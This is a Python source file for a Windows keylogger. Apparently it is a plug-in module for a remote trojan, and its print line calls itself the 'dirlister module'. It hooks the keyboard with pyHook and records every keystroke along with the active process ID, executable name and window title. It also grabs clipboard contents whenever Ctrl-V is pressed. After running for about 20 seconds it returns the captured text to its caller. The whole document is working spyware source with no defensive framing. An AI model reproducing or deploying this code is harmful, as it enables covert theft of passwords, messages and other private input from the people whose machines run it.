from ctypes import *
import pythoncom
import pyHook
import time
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
keystrokes = ""

def get_current_process():
	global keystrokes
	#get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()
	#find the process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	#store the current proess ID
	process_id = "%d" % pid.value

	#grab the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

	#now read its title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

	#print out the header if we're in the right process
	keystrokes += "\n" 
	keystrokes += "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
	keystrokes += "\n"

	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window
	global keystrokes
	#check to see if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	#if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		keystrokes += str(chr(event.Ascii),)
	else:
		#if [Ctrl-V], get the value on the clipboard
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			keystrokes += str("[PASTE] - %s" % (pasted_value),)

		else:
			keystrokes += str("[%s]" % event.Key,)

	#pass execution to next hook registered
	return True



def run(**args):

	print "[*] In dirlister module."
	kl = pyHook.HookManager()
	kl.KeyDown = KeyStroke

	#register the hook and execute forever
	kl.HookKeyboard()
	while time.clock() < 20:
		pythoncom.PumpWaitingMessages()

	return str(keystrokes)
